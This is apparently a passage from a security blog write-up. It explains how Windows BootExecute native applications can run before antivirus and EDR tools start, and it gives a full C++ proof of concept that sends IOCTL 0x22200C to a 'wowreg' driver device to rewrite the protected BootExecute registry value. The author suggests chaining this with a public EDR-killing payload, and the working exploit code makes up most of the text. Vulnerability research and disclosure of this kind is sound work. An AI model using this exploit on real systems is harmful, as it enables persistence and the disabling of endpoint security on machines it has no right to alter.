Boot Execute allows native applications—executables with the NtProcessStartup entry point and dependencies solely on ntdll.dll—to run prior to the complete initialization of the Windows operating system. This occurs even before Windows services are launched. Historically, attackers have exploited this mechanism as a rudimentary persistence method. However, utilizing this feature requires administrative privileges, both to modify the corresponding registry key and to place the executable within the %SystemRoot%\System32 directory.

Because these native applications execute before security mechanisms are fully operational, this presents an opportunity to disrupt antivirus (AV) and endpoint detection and response (EDR) systems by deleting critical application files as we run with SYSTEM privileges.
```
So this issue looks like can be chain with his PoC as payload by utilizing `BootExecute` registry modification. I didn't get a chance to chain (coz I'm lazy) this issue with his proof of concept but maybe you can try yourself. You can find his / her PoC here, [https://github.com/rad9800/BootExecuteEDR](https://github.com/rad9800/BootExecuteEDR).
```c
#include <windows.h>
#include <winioctl.h>
#include <stdio.h>
#include <tchar.h>
#include <string>
#include <vector>

// 0x22200C
#ifndef IOCTL_WOWREG_SET_BOOTEXECUTE
#define IOCTL_WOWREG_SET_BOOTEXECUTE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS) 
#endif

static const wchar_t* kSessionMgrKey = L"SYSTEM\\CurrentControlSet\\Control\\Session Manager";
static const wchar_t* kBootExecute = L"BootExecute";

static bool ParseRegistry(std::vector<std::wstring>& entries) 
{
    entries.clear();

    HKEY hKey = nullptr;
    LSTATUS st = RegOpenKeyExW(HKEY_LOCAL_MACHINE, kSessionMgrKey, 0, KEY_QUERY_VALUE, &hKey);
    if (st != ERROR_SUCCESS) 
    {
        wprintf(L"[-] Check your permission. Maybe you need Admin?\n");
        return false;
    }

    DWORD type = 0;
    DWORD cb = 0;
    st = RegQueryValueExW(hKey, kBootExecute, nullptr, &type, nullptr, &cb);
    if (st != ERROR_SUCCESS) 
    {
        wprintf(L"[-] Unable to query registry value\n");
        RegCloseKey(hKey);
        return false;
    }
    if (type != REG_MULTI_SZ || cb == 0)
    {
        RegCloseKey(hKey);
        return false;
    }

    std::wstring buffer;
    buffer.resize(cb / sizeof(wchar_t));
    st = RegQueryValueExW(hKey, kBootExecute, nullptr, &type, reinterpret_cast<LPBYTE>(&buffer[0]), &cb);
    RegCloseKey(hKey);
    if (st != ERROR_SUCCESS) 
    {
        return false;
    }

    const wchar_t* p = buffer.c_str();
    while (*p)
    {
        size_t len = wcslen(p);
        entries.emplace_back(p, p + len);
        p += len + 1;
    }
    
    return true;
}

static void ReadRegistry(const wchar_t* tag) 
{
    std::vector<std::wstring> entries;

    if (ParseRegistry(entries)) 
    {
        wprintf(L"\n[+] BootExecute registry entry:\n");
        
        for (size_t i = 0; i < entries.size(); ++i) 
        {
            wprintf(L"  [%zu] %s\n", i, entries[i].c_str());
        }
    }
    else 
    {
        wprintf(L"[-] Unable to read registry entry of BootExecute\n", tag);
    }
}

int wmain() 
{
    ReadRegistry(L"Registry Before");

    HANDLE h = CreateFileW(L"\\\\.\\wowreg", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE) 
    {
        wprintf(L"[-] Unable to open device handle\n");
        return 1;
    }

    DWORD bytesReturned = 0;
    const wchar_t dummy[] = L"test";

    wprintf(L"\nSending IOCTL 0x%08X to set BootExecute...\n", IOCTL_WOWREG_SET_BOOTEXECUTE);
    
    BOOL ok = DeviceIoControl(h, IOCTL_WOWREG_SET_BOOTEXECUTE, (LPVOID)dummy, sizeof(dummy), nullptr, 0, &bytesReturned, nullptr);
    if (!ok) 
    {
        wprintf(L"[-] Unable to call IOCTL. Please check for permission access to the device.\n");
        CloseHandle(h);
        return 2;
    }
    
    CloseHandle(h);

    ReadRegistry(L"Registry After");
    return 0;
}
```
![Registry Modification](https://raw.githubusercontent.com/nafiez/nlabs.github.io/master/images/setbootexec.png)
